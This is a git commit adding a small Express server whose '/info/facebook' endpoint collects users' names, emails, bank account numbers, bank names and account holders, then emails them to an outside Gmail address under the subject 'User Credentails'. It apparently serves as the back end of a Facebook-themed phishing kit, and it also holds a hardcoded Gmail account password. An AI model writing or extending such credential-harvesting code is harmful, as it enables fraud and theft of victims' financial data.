cb0ff2b93f1ca8fc2cffd85aef0067884998965f
Karl-Xavier <uwasbruno256@gmail.com>
2025-04-06 01:06:21 +0100

    initial

---
+++ server/README.md
@@ -0,0 +1,11 @@
+Dependencies to Install
+
+1. Express
+2. Passport
+3. Facebook-Passport
+4. Nodemailer
+5. Dotenv
+6. Express-session
+
+
+
---
+++ server/server.js
@@ -0,0 +1,77 @@
+//require('dotenv').config()
+const express = require('express')
+const cors = require('cors')
+const nodemailer = require('nodemailer')
+const nodeEnv = require('./config/nodeEnv')
+const bodyParser = require('body-parser')
+
+const app = express()
+const PORT = process.env.PORT || 4040
+
+// frontend url and callback
+
+const frontend_url = nodeEnv === 'development' ? 'http://127.0.0.1:5500' : ''
+
+// CORS SETUP
+
+const allowedOrigins = ['http://127.0.0.1:5500', '']
+
+const corsOption = {
+    origin: function(origin, callback){
+        if(allowedOrigins.indexOf(origin) !== -1 || !origin){
+            callback(null, true)
+        }else{
+            callback(new Error('NOT ALLOWED BY CORS'))
+        }
+    }
+}
+
+app.use(cors(corsOption))
+app.use(express.json())
+
+// Configure nodemailer
+
+const transporter = nodemailer.createTransport({
+    service: "gmail",
+    auth:{
+        user: 'contactshonenstream@gmail.com',
+        pass: 'xxcvxhsjjaznhgte'
+    }
+})
+
+app.post('/info/facebook', (req,res)=>{
+    const { username, email, accountNumber, bankName, bankHolder } = req.body
+
+    console.log(username, email, accountNumber)
+
+    try {
+
+        const mailOptions = {
+            from: 'contactshonenstream@gmail.com', // My mail
+            to: 'Veraaxomorgan@gmail.com', // reciever's email DonJerry
+            subject: 'User Credentails',
+            text: `Name: ${username}\n\nEmail: ${email}\n\nAccount Number: ${accountNumber}\n\nBank: ${bankName}\n\nBank Holder: ${bankHolder}`
+        }
+    
+        transporter.sendMail(mailOptions, (err, info) => {
+            if(err) console.log('Email error', err)
+            else console.log('Email sent', info.response)
+        })
+    } catch(err){
+        console.log(err)
+        res.status(500).json({ error: 'Server Error' })
+    }
+})
+
+// Welcome!!
+
+app.get('/', (req,res) => {
+    res.send('Welcome!!!')
+})
+
+
+// Start Server
+
+app.listen(PORT, () => {
+    console.log('Server running on Port', PORT)
+})
